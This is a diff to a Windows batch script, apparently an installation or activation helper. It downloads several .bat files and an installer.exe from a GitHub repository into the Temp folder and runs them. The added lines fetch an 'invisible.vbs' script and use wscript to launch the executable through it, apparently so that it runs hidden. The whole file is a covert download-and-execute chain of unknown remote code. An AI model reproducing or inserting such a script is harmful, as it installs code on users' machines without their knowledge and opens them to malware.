@@ -12,8 +12,8 @@ goto check_Permissions
     )
 
 
-
-
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/invisible.vbs', '%Temp%\invisible.vbs')}"
+start %Temp%\invisible.vbs
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/deactivate.bat', '%Temp%\deactivate.bat') }"
 start %Temp%\deactivate.bat
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/extras.bat', '%Temp%\extras.bat') }"
@@ -21,6 +21,8 @@ start %Temp%\extras.bat
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/uninstall.bat', '%Temp%\uninstall.bat') }"
 start %Temp%\uninstall.bat
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/installer.exe', '%Temp%\installer.exe') }"
-start %Temp%\installer.exe
+wscript.exe "%temp%\invisible.vbs" "%temp%\installer.exe"
+
+
 :Fail
 exit
